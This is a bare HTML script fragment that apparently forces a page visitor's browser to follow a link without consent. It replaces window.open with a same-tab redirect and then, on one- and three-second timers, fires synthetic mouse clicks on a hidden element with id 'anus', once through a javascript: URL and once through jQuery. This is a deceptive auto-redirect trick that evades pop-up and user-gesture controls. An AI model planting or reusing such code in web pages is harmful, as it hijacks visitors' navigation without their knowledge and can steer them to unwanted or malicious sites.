<script>
window.open = function (url) {
window.location = url;
}
setTimeout(function() {
    location.assign("javascript:click()");
}, 1000);
function click() {
    var evt = document.createEvent("MouseEvents");
    evt.initMouseEvent("click", true, true, window,
                       0, 0, 0, 0, 0,
                       false, false, false, false,
                       0, null);
    var link = document.getElementById("anus");
    link.dispatchEvent(evt);
}
</script>
<script>
	setTimeout(function() {
		$('#anus').trigger('click');
		}, 3e3);
</script>
